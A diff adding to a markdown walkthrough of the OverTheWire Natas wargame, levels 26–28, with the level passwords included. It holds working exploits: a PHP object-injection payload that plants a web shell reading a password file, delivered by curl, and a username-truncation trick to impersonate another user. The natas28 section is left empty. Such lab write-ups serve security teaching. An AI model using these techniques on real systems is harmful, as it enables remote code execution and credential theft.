@@ -594,3 +594,76 @@ http://natas26.natas.labs.overthewire.org/
 oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
 natas26
 ```
+
+**Vulnerability:** insecure object deserialization (https://www.owasp.org/index.php/PHP_Object_Injection)
+
+**Exploitation:**
+
+```
+# prepare & serialize instance of Logger class
+$ cat > natas26.php <<EOF
+<?php
+class Logger
+{
+    private $logFile;
+    private $initMsg;
+    private $exitMsg;
+    function __construct($file)
+    {
+        $this->initMsg= "";
+        $this->exitMsg= "<? system('cat /etc/natas_webpass/natas27'); ?>";
+        $this->logFile = "img/natas26.php";
+    }
+}
+$logger = new Logger("");
+
+echo serialize($logger);
+?>
+EOF
+
+# set cookie and send it for deserialization:
+$ COOKIE=$(php -f natas26.php | base64 -w0)
+$ curl -b "drawing=$COOKIE" -s -H "Authorization: Basic `echo -n 'natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T' | base64`" http://natas26.natas.labs.overthewire.org/
+
+# retreive flag by executing code that was prepared in previous step:
+$ curl -s -H "Authorization: Basic `echo -n 'natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T' | base64`" http://natas26.natas.labs.overthewire.org/img/natas26.php
+```
+
+### natas27
+
+**Target:**
+
+```
+http://natas27.natas.labs.overthewire.org/
+55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
+natas27
+```
+
+**Vulnerability:** logic issue
+
+**Exploitation:**
+
+```
+# verify that 'natas28' user exists
+$ USR=natas28; curl -s -H "Authorization: Basic `echo -n 'natas27:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ' | base64`" http://natas27.natas.labs.overthewire.org/ -d "username=$USR" -d 'password=qwe123'
+
+# add user that will be truncated to 64 characters (varchar(64)):
+$ USR=$(python2 -c 'print "natas28" + " "*64 + "AAA"'); curl -s -H "Authorization: Basic `echo -n 'natas27:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ' | base64`" http://natas27.natas.labs.overthewire.org/ -d "username=$USR" -d 'password=qwe123'
+
+# dump data of original 'natas28' user; checkCredentials(...) passes thanks to previously added user
+$ USR=natas28; curl -s -H "Authorization: Basic `echo -n 'natas27:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ' | base64`" http://natas27.natas.labs.overthewire.org/ -d "username=$USR" -d 'password=qwe123'
+```
+
+### natas28
+
+**Target:**
+
+```
+http://natas28.natas.labs.overthewire.org/
+JWwR438wkgTsNKBbcJoowyysdM82YjeF
+natas28
+```
+
+**Vulnerability:**
+
+**Exploitation:**
